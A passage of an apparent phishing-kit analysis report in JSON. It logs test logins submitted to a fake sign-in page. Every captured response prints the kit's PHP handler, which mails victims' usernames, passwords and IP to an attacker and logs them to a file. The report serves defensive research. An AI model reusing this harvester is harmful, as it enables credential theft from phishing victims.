@@ -1,0 +1,1494 @@
+{
+  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/",
+  "timestamp": "2026-05-06 10:04:06",
+  "mode": "whitebox",
+  "kit_path": "/var/www/html/phishing_kit_uncompress_20250519/2024-01-04_newrack",
+  "pages": [
+    {
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "forms": [
+        {
+          "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+          "method": "post",
+          "xpath": "//*[@id=\"form\"]",
+          "registered_handlers": [
+            {
+              "xpath": "//*[@id=\"login-btn\"]",
+              "tag": "BUTTON",
+              "name": "",
+              "type": "submit",
+              "id": "login-btn",
+              "handlers": [
+                {
+                  "event": "onclick",
+                  "functionBody": "function onclick(event) {\nsubmitLogin(event);\n}"
+                }
+              ]
+            }
+          ],
+          "fields": [
+            {
+              "name": "username",
+              "type": "text",
+              "xpath": "//*[@id=\"user-input\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "password",
+              "type": "password",
+              "xpath": "//*[@id=\"pass-input\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            }
+          ],
+          "submit_log": {
+            "enter_key_test": {
+              "skipped": true,
+              "reason": "network_only"
+            },
+            "enter_key_logs": {},
+            "native_submit": {
+              "form_meta": {
+                "action": "new.php",
+                "enctype": "application/x-www-form-urlencoded",
+                "id": "form",
+                "method": "POST",
+                "name": "login"
+              },
+              "cdp_reqs": [
+                {
+                  "requestId": "AD830F5C62F76DA470F7C11E50E4A0C7",
+                  "sequence": 1,
+                  "resourceType": "Document",
+                  "initiatorType": "other",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "236",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Origin": "http://www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Origin",
+                    "Pragma",
+                    "Referer",
+                    "Upgrade-Insecure-Requests",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=pgl&password=ev5ZChz6Cc",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "401",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:04:10 GMT",
+                    "Keep-Alive": "timeout=5, max=80",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 628,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 652,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 275076.565273,
+                  "lastEventTs": 1778029450844,
+                  "requestSentTs": 275076.565273,
+                  "responseReceivedTs": 275076.570603,
+                  "loadingFinishedTs": 275076.570441,
+                  "latencyMs": 5.2,
+                  "ttfbMs": 5.3,
+                  "_native_submit": true,
+                  "_submit_trigger_ts_ms": 1778029450761
+                }
+              ],
+              "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+            },
+            "submit_click_logs": {
+              "step": 1,
+              "phase": "submit_click",
+              "domChanges": [],
+              "networkReqs": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "type": "xhr",
+                  "method": "POST",
+                  "url": "new.php",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                  },
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "requestBody": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+                  "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+                  "status": 200,
+                  "response": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+                  "responseHeaders": {
+                    "connection": "Keep-Alive",
+                    "content-encoding": "gzip",
+                    "content-length": "401",
+                    "content-type": "text/html; charset=UTF-8",
+                    "date": "Wed, 06 May 2026 01:04:13 GMT",
+                    "keep-alive": "timeout=5, max=77",
+                    "server": "Apache/2.4.58 (Ubuntu)",
+                    "vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "responseReturned": true,
+                  "redirected": true,
+                  "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "responseBodyLength": 628,
+                  "timestamp": 1778029453790,
+                  "latencyMs": 3,
+                  "ttfbMs": null,
+                  "resolved_server": {
+                    "server_file": "newrack/New Rack/new.php",
+                    "receives_fields": [
+                      "password",
+                      "username"
+                    ],
+                    "actions": [
+                      {
+                        "type": "mail",
+                        "target": "[REDACTED_EMAIL]",
+                        "variable": "$recipient",
+                        "line": 14
+                      },
+                      {
+                        "type": "redirect",
+                        "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+                        "line": 18
+                      }
+                    ],
+                    "exfil": [
+                      "email:[REDACTED_EMAIL]"
+                    ]
+                  }
+                }
+              ],
+              "firedEvents": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseover",
+                  "targetXPath": "//*[@id=\"login-btn\"]",
+                  "targetTag": "BUTTON",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453786
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mousedown",
+                  "targetXPath": "//*[@id=\"login-btn\"]",
+                  "targetTag": "BUTTON",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453786
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "focus",
+                  "targetXPath": "//*[@id=\"login-btn\"]",
+                  "targetTag": "BUTTON",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453786
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseup",
+                  "targetXPath": "//*[@id=\"login-btn\"]",
+                  "targetTag": "BUTTON",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453787
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "click",
+                  "targetXPath": "//*[@id=\"login-btn\"]",
+                  "targetTag": "BUTTON",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453787
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "submit",
+                  "targetXPath": "//*[@id=\"form\"]",
+                  "targetTag": "FORM",
+                  "targetName": "login",
+                  "targetType": "",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778029453787
+                }
+              ],
+              "html5Validation": [],
+              "triggeredFunctions": [],
+              "cdpNetworkReqs": [
+                {
+                  "requestId": "777961.17",
+                  "sequence": 5,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "242",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Pragma",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "401",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:04:13 GMT",
+                    "Keep-Alive": "timeout=5, max=77",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 628,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 652,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 275079.534712,
+                  "lastEventTs": 1778029454293,
+                  "requestSentTs": 275079.534712,
+                  "responseReceivedTs": 275079.538073,
+                  "loadingFinishedTs": 275079.537253,
+                  "latencyMs": 2.5,
+                  "ttfbMs": 3.4,
+                  "_timing_summary": {
+                    "latencyMs": 2.5,
+                    "ttfbMs": 3.4,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ],
+              "jqueryDispatchLogs": []
+            },
+            "submit_trigger_ts_ms": 1778029453753,
+            "submit_timing": {
+              "python_click_ts_ms": 1778029453753,
+              "js_trigger_event_ts_ms": 1778029453787,
+              "js_first_req_ts_ms": 1778029453790,
+              "event_to_request_ms": 3,
+              "cdp_req_count": 1
+            },
+            "submit_detail": {
+              "action": "new.php",
+              "fields": {
+                "__RequestVerificationToken": "CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE",
+                "destination": "",
+                "flags": "4",
+                "password": "923e2yFoqe7n",
+                "username": "bedobfp"
+              },
+              "method": "POST",
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseLength": 628,
+              "status": 200,
+              "submitted": true,
+              "cdp_network": [
+                {
+                  "requestId": "777961.17",
+                  "sequence": 5,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "242",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Pragma",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "401",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:04:13 GMT",
+                    "Keep-Alive": "timeout=5, max=77",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 628,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 652,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 275079.534712,
+                  "lastEventTs": 1778029454293,
+                  "requestSentTs": 275079.534712,
+                  "responseReceivedTs": 275079.538073,
+                  "loadingFinishedTs": 275079.537253,
+                  "latencyMs": 2.5,
+                  "ttfbMs": 3.4,
+                  "_timing_summary": {
+                    "latencyMs": 2.5,
+                    "ttfbMs": 3.4,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ]
+            }
+          },
+          "overall_classification": "Case B: Server Round-trip (AJAX)",
+          "field_stats": {
+            "dom_analysable": 2,
+            "visible_now": 2,
+            "hidden_or_collapsed": 0
+          },
+          "static_action_analysis": {
+            "server_file": "newrack/New Rack/new.php",
+            "receives_fields": [
+              "password",
+              "username"
+            ],
+            "actions": [
+              {
+                "type": "mail",
+                "target": "[REDACTED_EMAIL]",
+                "variable": "$recipient",
+                "line": 14
+              },
+              {
+                "type": "redirect",
+                "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+                "line": 18
+              }
+            ],
+            "exfil": [
+              "email:[REDACTED_EMAIL]"
+            ]
+          },
+          "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html"
+        }
+      ]
+    }
+  ],
+  "forms": [
+    {
+      "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "method": "post",
+      "xpath": "//*[@id=\"form\"]",
+      "registered_handlers": [
+        {
+          "xpath": "//*[@id=\"login-btn\"]",
+          "tag": "BUTTON",
+          "name": "",
+          "type": "submit",
+          "id": "login-btn",
+          "handlers": [
+            {
+              "event": "onclick",
+              "functionBody": "function onclick(event) {\nsubmitLogin(event);\n}"
+            }
+          ]
+        }
+      ],
+      "fields": [
+        {
+          "name": "username",
+          "type": "text",
+          "xpath": "//*[@id=\"user-input\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        },
+        {
+          "name": "password",
+          "type": "password",
+          "xpath": "//*[@id=\"pass-input\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        }
+      ],
+      "submit_log": {
+        "enter_key_test": {
+          "skipped": true,
+          "reason": "network_only"
+        },
+        "enter_key_logs": {},
+        "native_submit": {
+          "form_meta": {
+            "action": "new.php",
+            "enctype": "application/x-www-form-urlencoded",
+            "id": "form",
+            "method": "POST",
+            "name": "login"
+          },
+          "cdp_reqs": [
+            {
+              "requestId": "AD830F5C62F76DA470F7C11E50E4A0C7",
+              "sequence": 1,
+              "resourceType": "Document",
+              "initiatorType": "other",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
+                "Content-Length": "236",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "www.2026.com:8080",
+                "Origin": "http://www.2026.com:8080",
+                "Pragma": "no-cache",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Accept",
+                "Accept-Encoding",
+                "Accept-Language",
+                "Cache-Control",
+                "Connection",
+                "Content-Length",
+                "Content-Type",
+                "Host",
+                "Origin",
+                "Pragma",
+                "Referer",
+                "Upgrade-Insecure-Requests",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=pgl&password=ev5ZChz6Cc",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "401",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:04:10 GMT",
+                "Keep-Alive": "timeout=5, max=80",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 628,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 652,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 275076.565273,
+              "lastEventTs": 1778029450844,
+              "requestSentTs": 275076.565273,
+              "responseReceivedTs": 275076.570603,
+              "loadingFinishedTs": 275076.570441,
+              "latencyMs": 5.2,
+              "ttfbMs": 5.3,
+              "_native_submit": true,
+              "_submit_trigger_ts_ms": 1778029450761
+            }
+          ],
+          "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+        },
+        "submit_click_logs": {
+          "step": 1,
+          "phase": "submit_click",
+          "domChanges": [],
+          "networkReqs": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "type": "xhr",
+              "method": "POST",
+              "url": "new.php",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              "requestContentType": "application/x-www-form-urlencoded",
+              "requestBody": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+              "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+              "status": 200,
